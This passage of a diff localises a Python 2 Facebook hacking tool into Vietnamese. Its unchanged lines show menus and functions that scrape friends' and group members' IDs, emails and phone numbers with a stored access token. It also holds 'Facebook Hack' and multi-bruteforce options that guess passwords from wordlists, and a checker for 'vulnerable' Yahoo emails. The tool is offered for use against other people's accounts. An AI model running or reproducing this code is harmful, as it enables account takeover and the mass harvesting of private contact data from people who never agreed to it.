+		done = raw_input("\r\033[1;91m[+] \033[1;92mLưu tệp với tên\033[1;91m :\033[1;97m ")
 		os.rename('out/email_friends.txt','out/'+done)
-		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
+		print("\r\033[1;91m[+] \033[1;92mĐã lưu \033[1;91m: \033[1;97mout/"+done)
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		dump()
 	except IOError:
-		print"\033[1;91m[!] Error creating file"
+		print"\033[1;91m[!] Tạo tệp thất bại"
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		dump()
 	except (KeyboardInterrupt,EOFError):
-		print("\033[1;91m[!] Stopped")
+		print("\033[1;91m[!] Đã dừng lại")
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		dump()
 	except KeyError:
-		print('\033[1;91m[!] Error')
+		print('\033[1;91m[!] Lỗi')
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		dump()
 	except requests.exceptions.ConnectionError:
-		print"\033[1;91m[✖] No connection"
+		print"\033[1;91m[✖] Không có kết nối"
 		exit()
 
 ##### EMAIL FROM FRIENDS #####
@@ -742,7 +743,7 @@ def email_from_friends():
 	try:
 		fb_token=open('login.txt','r').read()
 	except IOError:
-		print"\033[1;91m[!] Token not found"
+		print"\033[1;91m[!] Không có kết nối"
 		os.system('rm -rf login.txt')
 		time.sleep(0.01)
 		login()
@@ -753,18 +754,18 @@ def email_from_friends():
 	try:
 		os.system('clear')
 		print logo
-		idt = raw_input("\033[1;91m[+] \033[1;92mInput ID friend \033[1;91m: \033[1;97m")
+		idt = raw_input("\033[1;91m[+] \033[1;92mNhập ID Bạn Bè \033[1;91m: \033[1;97m")
 		try:
 			seat = requests.get("https://graph.facebook.com/"+idt+"?access_token="+fb_token)
 			op = json.loads(seat.text)
 			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom\033[1;91m :\033[1;97m "+op["name"]
 		except KeyError:
-			print"\033[1;91m[!] Friend not found"
+			print"\033[1;91m[!] Không tìm thấy bạn bè"
 			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 			dump()
 		r = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+fb_token)
 		a = json.loads(r.text)
-		mkdir('\033[1;91m[✺] \033[1;92mGet all friend email from friend \033[1;97m...')
+		mkdir('\033[1;91m[✺] \033[1;92mGet tất cả email bạn của bạn bè \033[1;97m...')
 		print 42*"\033[1;97m═"
 		make_action = open('out/em_friends_from_friends.txt','w')
 		for i in a['data']:
@@ -778,27 +779,27 @@ def email_from_friends():
 				pass
 		make_action.close()
 		print 42*"\033[1;97m═"
-		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get email \033[1;97m....'
-		print"\r\033[1;91m[+] \033[1;92mTotal Email \033[1;91m: \033[1;97m%s"%(len(email_from_friends))
-		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
+		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mGet email thành công \033[1;97m....'
+		print"\r\033[1;91m[+] \033[1;92mToàn bộ Email \033[1;91m: \033[1;97m%s"%(len(email_from_friends))
+		done = raw_input("\r\033[1;91m[+] \033[1;92mLưu tệp với tên\033[1;91m :\033[1;97m ")
 		os.rename('out/em_friends_from_friends.txt','out/'+done)
-		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
+		print("\r\033[1;91m[+] \033[1;92mĐã lưu tệp \033[1;91m: \033[1;97mout/"+done)
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		dump()
 	except IOError:
-		print"\033[1;91m[!] Error creating file"
+		print"\033[1;91m[!] không thể tạo file"
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		dump()
 	except (KeyboardInterrupt,EOFError):
-		print("\033[1;91m[!] Stopped")
+		print("\033[1;91m[!] Đã dừng lại")
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		dump()
 	except KeyError:
-		print('\033[1;91m[!] Error')
+		print('\033[1;91m[!] Lỗi')
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		dump()
 	except requests.exceptions.ConnectionError:
-		print"\033[1;91m[✖] No connection"
+		print"\033[1;91m[✖] Không có Kết nối"
 		exit()
 
 ##### PHONE NUMBER #####
@@ -807,7 +808,7 @@ def phone_number():
 	try:
 		fb_token=open('login.txt','r').read()
 	except IOError:
-		print"\033[1;91m[!] Token not found"
+		print"\033[1;91m[!] Không tìm thấy token"
 		os.system('rm -rf login.txt')
 		time.sleep(0.01)
 		login()
@@ -818,7 +819,7 @@ def phone_number():
 	try:
 		os.system('clear')
 		print logo
-		mkdir('\033[1;91m[✺] \033[1;92mGet all friend number phone \033[1;97m...')
+		mkdir('\033[1;91m[✺] \033[1;92mGet tất cả SDT Của Bạn Bè \033[1;97m...')
 		print 42*"\033[1;97m═"
 		url= "https://graph.facebook.com/me/friends?access_token="+fb_token
 		r =requests.get(url)
@@ -835,27 +836,27 @@ def phone_number():
 				pass
 		make_action.close()
 		print 42*"\033[1;97m═"
-		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get number \033[1;97m....'
-		print"\r\033[1;91m[+] \033[1;92mTotal Number \033[1;91m: \033[1;97m%s"%(len(hp))
-		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
+		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mGet SDT Thành Công \033[1;97m....'
+		print"\r\033[1;91m[+] \033[1;92mToàn bộ Số \033[1;91m: \033[1;97m%s"%(len(hp))
+		done = raw_input("\r\033[1;91m[+] \033[1;92mLưu tệp với tên\033[1;91m :\033[1;97m ")
 		os.rename('out/nomer_friends.txt','out/'+done)
-		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
+		print("\r\033[1;91m[+] \033[1;92mĐã lưu tệp \033[1;91m: \033[1;97mout/"+done)
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		dump()
 	except IOError:
-		print"\033[1;91m[!] Error creating file"
+		print"\033[1;91m[!] Không Thể tạo Tệp"
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		dump()
 	except (KeyboardInterrupt,EOFError):
-		print("\033[1;91m[!] Stopped")
+		print("\033[1;91m[!] Đã dừng lại")
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		dump()
 	except KeyError:
-		print('\033[1;91m[!] Error')
+		print('\033[1;91m[!] lỗi')
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		dump()
 	except requests.exceptions.ConnectionError:
-		print"\033[1;91m[✖] No connection"
+		print"\033[1;91m[✖] Không có kến nối"
 		exit()
 
 ##### PHONE NUMBER FROM FRIENDS #####
@@ -864,7 +865,7 @@ def phone_number_from_friends():
 	try:
 		fb_token=open('login.txt','r').read()
 	except IOError:
-		print"\033[1;91m[!] Token not found"
+		print"\033[1;91m[!] Không  tìm  thấy token"
 		os.system('rm -rf login.txt')
 		time.sleep(0.01)
 		login()
@@ -875,18 +876,18 @@ def phone_number_from_friends():
 	try:
 		os.system('clear')
 		print logo
-		idt = raw_input("\033[1;91m[+] \033[1;92mInput ID friend \033[1;91m: \033[1;97m")
+		idt = raw_input("\033[1;91m[+] \033[1;92mNhập ID Bạn Bè \033[1;91m: \033[1;97m")
 		try:
 			seat = requests.get("https://graph.facebook.com/"+idt+"?access_token="+fb_token)
 			op = json.loads(seat.text)
 			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom\033[1;91m :\033[1;97m "+op["name"]
 		except KeyError:
-			print"\033[1;91m[!] Friend not found"
+			print"\033[1;91m[!] Không Tìm Thấy Bạn bè"
 			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 			dump()
 		r = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+fb_token)
 		a = json.loads(r.text)
-		mkdir('\033[1;91m[✺] \033[1;92mGet all friend number from friend \033[1;97m...')
+		mkdir('\033[1;91m[✺] \033[1;92mGet tất cả SDT Bạn của bạn bè \033[1;97m...')
 		print 42*"\033[1;97m═"
 		make_action = open('out/no_friends_from_friends.txt','w')
 		for i in a['data']:
@@ -900,27 +901,27 @@ def phone_number_from_friends():
 				pass
 		make_action.close()
 		print 42*"\033[1;97m═"
-		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get number \033[1;97m....'
-		print"\r\033[1;91m[+] \033[1;92mTotal Number \033[1;91m: \033[1;97m%s"%(len(hpfromfriends))
-		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
+		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mGet SDT thành công \033[1;97m....'
+		print"\r\033[1;91m[+] \033[1;92mToàn bộ số \033[1;91m: \033[1;97m%s"%(len(hpfromfriends))
+		done = raw_input("\r\033[1;91m[+] \033[1;92mLưu file với tên\033[1;91m :\033[1;97m ")
 		os.rename('out/no_friends_from_friends.txt','out/'+done)
-		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
+		print("\r\033[1;91m[+] \033[1;92mĐã lưu file \033[1;91m: \033[1;97mout/"+done)
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		dump()
 	except IOError:
-		print"\033[1;91m[!] Error creating file"
+		print"\033[1;91m[!] Không thể tạo file"
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		dump()
 	except (KeyboardInterrupt,EOFError):
-		print("\033[1;91m[!] Stopped")
+		print("\033[1;91m[!] Đã dừng lại")
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		dump()
 	except KeyError:
-		print('\033[1;91m[!] Error')
+		print('\033[1;91m[!] Lỗi')
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		dump()
 	except requests.exceptions.ConnectionError:
-		print"\033[1;91m[✖] No connection"
+		print"\033[1;91m[✖] Không có kết nối"
 		exit()
 
 ##### MENU HACK #####
@@ -929,15 +930,15 @@ def menu_hack():
 	try:
 		fb_token=open('login.txt','r').read()
 	except IOError:
-		print"\033[1;91m[!] Token not found"
+		print"\033[1;91m[!] Không tìm thấy token"
 		os.system('rm -rf login.txt')
 		time.sleep(0.01)
 		login()
 	os.system('clear')
 	print logo
-	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Simple Facebook Hack(\033[1;92mTarget\033[1;97m)"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Facebook Multi Bruteforce"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Strong Facebook Multi Bruteforce "
+	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Hack Facebook Đơn Giản(\033[1;92mTarget\033[1;97m)"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Facebook Đa Lực Lượng"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Facebook Đa Lực Lượng Mạnh Mẽ "
 	print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m Facebook BruteForce(\033[1;92mTarget\033[1;97m)"
 	print "\033[1;97m║--\033[1;91m> \033[1;92m5.\033[1;97m Yahoo Check"
 	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
@@ -947,7 +948,7 @@ def menu_hack():
 def choose_hack():
 	hack = raw_input("\033[1;97m╚═\033[1;91m>>> \033[1;97m")
 	if hack=="":
-		print "\033[1;91m[!] Wrong input"
+		print "\033[1;91m[!] Nhập Sai"
 		choose_hack()
 	elif hack =="1":
 		mini()
@@ -963,7 +964,7 @@ def choose_hack():
 	elif hack =="0":
 		menu()
 	else:
-		print "\033[1;91m[!] Wrong input"
+		print "\033[1;91m[!] Nhập sai"
 		choose_hack()
 
 ##### MINI HF #####
@@ -972,17 +973,17 @@ def mini():
 	try:
 		fb_token=open('login.txt','r').read()
 	except IOError:
-		print"\033[1;91m[!] Token not found"
+		print"\033[1;91m[!] Không tìm thấy token"
 		os.system('rm -rf login.txt')
 		time.sleep(0.01)
 		login()
 	os.system('clear')
 	print logo
-	print "\033[1;97m[\033[1;91mINFO\033[1;97m] \033[1;91mThe target account must be friends\n       with your account first!"
+	print "\033[1;97m[\033[1;91mThông tin\033[1;97m] \033[1;91mTài Khoản Đích\n       Trước Tiên Phải Là Bạn Bè Với Bạn"
 	print 42*"\033[1;97m═"
 	try:
 		id = raw_input("\033[1;91m[+] \033[1;92mTarget ID \033[1;91m:\033[1;97m ")
-		mkdir('\033[1;91m[✺] \033[1;92mWait a minute \033[1;97m...')
+		mkdir('\033[1;91m[✺] \033[1;92mChờ Một Chút \033[1;97m...')
 		r = requests.get("https://graph.facebook.com/"+id+"?access_token="+fb_token)
 		a = json.loads(r.text)
 		print '\033[1;91m[➹] \033[1;92mName\033[1;97m : '+a['name']
@@ -1134,12 +1135,12 @@ def mini():
 																raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 																menu_hack()
 															else:
-																print "\033[1;91m[!] Sorry, exit to open the target password :("
-																print "\033[1;91m[!] try it another way."
+																print "\033[1;91m[!] Sorry, thoát ra để mở mật khẩu mục tiêu:("
+																print "\033[1;91m[!] Thử Theo Cách Khác."
 																raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 																menu_hack()
 	except KeyError:
-		print "\033[1;91m[!] Terget not found"
+		print "\033[1;91m[!] Không tìm thấy mục tiêu"
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		menu_hack()
 
@@ -1152,7 +1153,7 @@ def crack():
 	try:
 		fb_token=open('login.txt','r').read()
 	except IOError:
-		print"\033[1;91m[!] Token not found"
+		print"\033[1;91m[!] không tìm thấy token"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
 		login()
@@ -1170,7 +1171,7 @@ def crack():
 		for pick in threads:
 			pick.join()
 	except IOError:
-		print ("\033[1;91m[!] File not found")
+		print ("\033[1;91m[!] Không tìm thấy file")
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		menu_hack()
 
@@ -1210,7 +1211,7 @@ def scrak():
 		print"\n\033[1;91m[!] Sleep"
 		time.sleep(0.01)
 	except requests.exceptions.ConnectionError:
-		print"\033[1;91m[✖] No connection"
+		print"\033[1;91m[✖] Không có kết nối"
 
 def success():
 	print
@@ -1233,16 +1234,16 @@ def super():
 	try:
 		fb_token=open('login.txt','r').read()
 	except IOError:
-		print"\033[1;91m[!] Token not found"
+		print"\033[1;91m[!] Không tìm thấy token"
 		os.system('rm -rf login.txt')
 		time.sleep(0.0)
 		login()
 	os.system('clear')
 	print logo
-	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Crack with list friend"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Crack from friend"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Crack from member group"
-        print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m Crack from File"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Crack với người bạn trong danh sách"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Crack từ bạn bè"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Crack từ thành viên group"
+        print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m Crack từ file"
 	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
 	print "║"
 	choices_super()
@@ -1250,12 +1251,12 @@ def super():
 def choices_super():
 	peak = raw_input("\033[1;97m╚═\033[1;91m>>> \033[1;97m")
 	if peak =="":
-		print "\033[1;91m[!] Wrong input"
+		print "\033[1;91m[!] nhập sai"
 		choices_super()
 	elif peak =="1":
 		os.system('clear')
 		print logo
-		mkdir('\033[1;91m[✺] \033[1;92mGet all friend id \033[1;97m...')
+		mkdir('\033[1;91m[✺] \033[1;92mGet tất cả id bạn bè \033[1;97m...')
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+fb_token)
 		z = json.loads(r.text)
 		for s in z['data']:
@@ -1263,16 +1264,16 @@ def choices_super():
 	elif peak =="2":
 		os.system('clear')
 		print logo
-		idt = raw_input("\033[1;91m[+] \033[1;92mInput ID friend \033[1;91m: \033[1;97m")
+		idt = raw_input("\033[1;91m[+] \033[1;92mNhập id bạn bè \033[1;91m: \033[1;97m")
 		try:
 			seat = requests.get("https://graph.facebook.com/"+idt+"?access_token="+fb_token)
 			op = json.loads(seat.text)
-			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom\033[1;91m :\033[1;97m "+op["name"]
+			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mTừ\033[1;91m :\033[1;97m "+op["name"]
 		except KeyError:
-			print"\033[1;91m[!] Friend not found"
+			print"\033[1;91m[!] không tìm thấy bạn bè"
 			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 			super()
-		mkdir('\033[1;91m[✺] \033[1;92mGet all id from friend \033[1;97m...')
+		mkdir('\033[1;91m[✺] \033[1;92mGet tất cả id từ bạn bè \033[1;97m...')
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+fb_token)
 		z = json.loads(r.text)
 		for i in z['data']:
@@ -1280,16 +1281,16 @@ def choices_super():
 	elif peak =="3":
 		os.system('clear')
 		print logo
-		idg=raw_input('\033[1;91m[+] \033[1;92mInput ID group \033[1;91m:\033[1;97m ')
+		idg=raw_input('\033[1;91m[+] \033[1;92mNhập id group \033[1;91m:\033[1;97m ')
 		try:
 			r=requests.get('https://graph.facebook.com/group/?id='+idg+'&access_token='+fb_token)
 			asw=json.loads(r.text)
-			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom group \033[1;91m:\033[1;97m "+asw['name']
+			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mTừ group \033[1;91m:\033[1;97m "+asw['name']
 		except KeyError:
-			print"\033[1;91m[!] Group not found"
+			print"\033[1;91m[!] Không tìm thấy group"
 			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 			super()
-		mkdir('\033[1;91m[✺] \033[1;92mGet group member id \033[1;97m...')
+		mkdir('\033[1;91m[✺] \033[1;92mGet id  thành  viên group \033[1;97m...')
 		re=requests.get('https://graph.facebook.com/'+idg+'/members?fields=name,id&limit=9999999999999&access_token='+fb_token)
 		s=json.loads(re.text)
 		for p in s['data']:
@@ -1302,16 +1303,16 @@ def choices_super():
                         for line in open(idlist,'r').readlines():
                                 id.append(line.strip())
                 except KeyError:
-                        print '\033[1;91m[!] File not found'
+                        print '\033[1;91m[!] Không tìm thấy  file'
                         raw_input('\n\033[1;91m[ \033[1;97mBack \033[1;91m]')
                         super()
 	elif peak =="0":
 		menu_hack()
 	else:
-		print "\033[1;91m[!] Wrong input"
+		print "\033[1;91m[!] Nhập sai"
 		choices_super()
 
-        print "\033[1;91m[+] \033[1;92mTotal ID \033[1;91m: \033[1;97m"+str(len(id))
+        print "\033[1;91m[+] \033[1;92mToàn bộ ID \033[1;91m: \033[1;97m"+str(len(id))
         mkdir('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
 	tiload = ['.   ','..  ','... ']
 	for o in tiload:
@@ -1471,8 +1472,8 @@ def choices_super():
 	p.map(main, id)
 	print 42*"\033[1;97m═"
 	print '\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mDone \033[1;97m....'
-	print"\033[1;91m[+] \033[1;92mTotal OK/CP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(checkpoint))
-	print("\033[1;91m[+] \033[1;92mCP File saved \033[1;91m: \033[1;97mout/output.txt")
+	print"\033[1;91m[+] \033[1;92mToàn bộ OK/CP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(checkpoint))
+	print("\033[1;91m[+] \033[1;92mCP đã lưu \033[1;91m: \033[1;97mout/output.txt")
 	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 	super()
 ######################################################
@@ -1484,7 +1485,7 @@ def brute():
 	try:
 		fb_token=open('login.txt','r').read()
 	except IOError:
-		print"\033[1;91m[!] Token not found"
+		print"\033[1;91m[!] Không  tìm  thấy token"
 		os.system('rm -rf login.txt')
 		time.sleep(0.01)
 		login()
@@ -1492,12 +1493,12 @@ def brute():
 	print logo
 	try:
 		email = raw_input("\033[1;91m[+] \033[1;92mID\033[1;97m/\033[1;92mEmail\033[1;97m/\033[1;92mHp \033[1;97mTarget \033[1;91m:\033[1;97m ")
-		passw = raw_input("\033[1;91m[+] \033[1;92mWordlist \033[1;97mext(list.txt) \033[1;91m: \033[1;97m")
+		passw = raw_input("\033[1;91m[+] \033[1;92mDanh sách từ \033[1;97mext(list.txt) \033[1;91m: \033[1;97m")
 		total = open(passw,"r")
 		total = total.readlines()
 		print 42*"\033[1;97m═"
 		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mTarget \033[1;91m:\033[1;97m "+email
-		print "\033[1;91m[+] \033[1;92mTotal\033[1;96m "+str(len(total))+" \033[1;92mPassword"
+		print "\033[1;91m[+] \033[1;92mToàn bộ\033[1;96m "+str(len(total))+" \033[1;92mPassword"
 		mkdir('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
 		sandi = open(passw,"r")
 		for pw in sandi:
@@ -1527,15 +1528,15 @@ def brute():
 					print("\033[1;91m[➹] \033[1;92mPassword \033[1;91m:\033[1;97m "+pw)
 					exit()
 			except requests.exceptions.ConnectionError:
-				print"\033[1;91m[!] Connection Error"
+				print"\033[1;91m[!] Lỗi kết nối"
 				time.sleep(0.01)
 	except IOError:
-		print ("\033[1;91m[!] File not found")
+		print ("\033[1;91m[!] Không tìm thấy  file")
 		wordlst()
 def wordlst():
-	why = raw_input("\033[1;91m[?] \033[1;92mCreate wordlist ? \033[1;92m[y/n]\033[1;91m:\033[1;97m ")
+	why = raw_input("\033[1;91m[?] \033[1;92mTạo danh sách từ ? \033[1;92m[y/n]\033[1;91m:\033[1;97m ")
 	if why =="":
-		print "\033[1;91m[!] Wrong"
+		print "\033[1;91m[!] sai"
 		wordlst()
 	elif why =="y":
 		wordlist()
@@ -1546,7 +1547,7 @@ def wordlst():
 	elif why =="N":
 		menu_hack()
 	else:
-		print "\033[1;91m[!] Wrong"
+		print "\033[1;91m[!] sai"
 		wordlst()
 
 ##### YAHOO CHECKER #####
@@ -1557,16 +1558,16 @@ def menu_yahoo():
 	try:
 		fb_token=open('login.txt','r').read()
 	except IOError:
-		print"\033[1;91m[!] Token not found"
+		print"\033[1;91m[!] Không  tìm  thấy token"
 		os.system('rm -rf login.txt')
 		time.sleep(0.01)
 		login()
 	os.system('clear')
 	print logo
-	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m With list friend"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Clone from friend"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Clone from member group"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m Using file"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Với người bạn trong danh sách"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Sao chép từ bạn bè"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Sao chép từ thành viên group"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m Sử dụng tệp"
 	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
 	print "║"
 	choose_yahoo()
@@ -1574,7 +1575,7 @@ def menu_yahoo():
 def choose_yahoo():
 	go = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
 	if go =="":
-		print "\033[1;91m[!] Wrong"
+		print "\033[1;91m[!] sai"
 		choose_yahoo()
 	elif go =="1":
 		yahoofriends()
@@ -1587,7 +1588,7 @@ def choose_yahoo():
 	elif go =="0":
 		menu_hack()
 	else:
-		print "\033[1;91m[!] Wrong"
+		print "\033[1;91m[!] sai"
 		choose_yahoo()
 
 ##### LIST FRIEND #####
@@ -1597,7 +1598,7 @@ def yahoofriends():
 	try:
 		fb_token=open('login.txt','r').read()
 	except IOError:
-		print"\033[1;91m[!] Token not found"
+		print"\033[1;91m[!] Không  tìm  thấy token"
 		os.system('rm -rf login.txt')
 		time.sleep(0.01)
 		login()
@@ -1609,7 +1610,7 @@ def yahoofriends():
 	print logo
 	mpsh = []
 	jcsb = 0
-	mkdir('\033[1;91m[✺] \033[1;92mGetting email friend \033[1;97m...')
+	mkdir('\033[1;91m[✺] \033[1;92mget email kết  bạn \033[1;97m...')
 	friends = requests.get('https://graph.facebook.com/me/friends?access_token='+fb_token)
 	mitchy = json.loads(friends.text)
 	save = open('out/MailVuln.txt','w')
@@ -1645,8 +1646,8 @@ def yahoofriends():
 			pass
 	print 42*"\033[1;97m═"
 	print '\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mDone \033[1;97m....'
-	print"\033[1;91m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(sucessful))
-	print"\033[1;91m[+] \033[1;92mFile saved \033[1;91m:\033[1;97m out/MailVuln.txt"
+	print"\033[1;91m[+] \033[1;92mToàn bộ \033[1;91m: \033[1;97m"+str(len(sucessful))
+	print"\033[1;91m[+] \033[1;92mFile đã lưu \033[1;91m:\033[1;97m out/MailVuln.txt"
 	save.close()
 	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 	menu_yahoo()
@@ -1658,7 +1659,7 @@ def yahoofromfriends():
 	try:
 		fb_token=open('login.txt','r').read()
 	except IOError:
-		print"\033[1;91m[!] Token not found"
+		print"\033[1;91m[!] Không  tìm  thấy token"
 		os.system('rm -rf login.txt')
 		time.sleep(0.01)
 		login()
@@ -1670,16 +1671,16 @@ def yahoofromfriends():
 	print logo
 	mpsh = []
 	jcsb = 0
-	idt = raw_input("\033[1;91m[+] \033[1;92mInput ID friend \033[1;91m: \033[1;97m")
+	idt = raw_input("\033[1;91m[+] \033[1;92mNhập id bạn bè \033[1;91m: \033[1;97m")
 	try:
 		seat = requests.get("https://graph.facebook.com/"+idt+"?access_token="+fb_token)
 		op = json.loads(seat.text)
-		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom\033[1;91m :\033[1;97m "+op["name"]
+		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mTừ\033[1;91m :\033[1;97m "+op["name"]
 	except KeyError:
-		print"\033[1;91m[!] Friend not found"
+		print"\033[1;91m[!] không tìm thấy bạn bè"
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		menu_yahoo()
-	mkdir('\033[1;91m[✺] \033[1;92mGetting email from friend \033[1;97m...')
+	mkdir('\033[1;91m[✺] \033[1;92mGetting email Từ bạn bè \033[1;97m...')
 	friends = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+fb_token)
 	mitchy = json.loads(friends.text)
 	save = open('out/FriendMailVuln.txt','w')
@@ -1715,8 +1716,8 @@ def yahoofromfriends():
 			pass
 	print 42*"\033[1;97m═"
 	print '\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mDone \033[1;97m....'
-	print"\033[1;91m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(sucessful))
-	print"\033[1;91m[+] \033[1;92mFile saved \033[1;91m:\033[1;97m out/FriendMailVuln.txt"
+	print"\033[1;91m[+] \033[1;92mToàn bộ \033[1;91m: \033[1;97m"+str(len(sucessful))
+	print"\033[1;91m[+] \033[1;92mFile đã lưu \033[1;91m:\033[1;97m out/FriendMailVuln.txt"
 	save.close()
 	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 	menu_yahoo()
@@ -1728,7 +1729,7 @@ def yahoomember():
 	try:
 		fb_token=open('login.txt','r').read()
 	except IOError:
-		print"\033[1;91m[!] Token not found"
+		print"\033[1;91m[!] Không  tìm  thấy token"
 		os.system('rm -rf login.txt')
 		time.sleep(0.01)
 		login()
@@ -1740,16 +1741,16 @@ def yahoomember():
 	print logo
 	mpsh = []
 	jcsb = 0
-	id=raw_input('\033[1;91m[+] \033[1;92mInput ID group \033[1;91m:\033[1;97m ')
+	id=raw_input('\033[1;91m[+] \033[1;92mNhập id group \033[1;91m:\033[1;97m ')
 	try:
 		r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+fb_token)
 		asw=json.loads(r.text)
-		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom group \033[1;91m:\033[1;97m "+asw['name']
+		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mTừ Group \033[1;91m:\033[1;97m "+asw['name']
 	except KeyError:
-		print"\033[1;91m[!] Group not found"
+		print"\033[1;91m[!] Không tìm thấy group"
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		menu_yahoo()
-	mkdir('\033[1;91m[✺] \033[1;92mGetting email from group \033[1;97m...')
+	mkdir('\033[1;91m[✺] \033[1;92mGetting email Từ Group \033[1;97m...')
 	friends = requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+fb_token)
